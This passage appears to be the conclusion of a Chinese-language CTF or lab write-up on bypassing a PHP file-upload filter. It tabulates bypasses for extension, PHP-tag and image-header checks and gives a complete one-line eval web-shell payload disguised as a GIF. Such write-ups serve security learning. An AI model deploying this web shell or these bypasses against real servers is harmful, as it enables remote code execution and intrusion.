## 经验教训

### 检测机制分析
1. **扩展名黑名单**: 拦截 `.php`, `.php3` 等，但 `.phtml` 可用
2. **内容检测**: 检测 `<?` 标签，阻止常规PHP代码
3. **图片检测**: 检测文件头是否为有效图片格式

### 绕过方法总结
| 检测层 | 绕过方法 |
|--------|----------|
| 扩展名 | `.phtml` (非标准PHP扩展名) |
| PHP标签 | `<script language="php">` (PHP 5.x支持的替代语法) |
| 图片头 | `GIF89a` 前缀 |

### 最终Payload
```
文件名: shell.phtml
内容: GIF89a<script language="php">@eval($_POST["cmd"]);</script>
Content-Type: image/gif
```

### 注意事项
- `<script language="php">` 语法在PHP 7.0后已移除，仅适用于PHP 5.x
- 上传后需找到文件存放路径（常见: /upload/, /uploads/）
- 图片马需要服务器能解析PHP才能执行
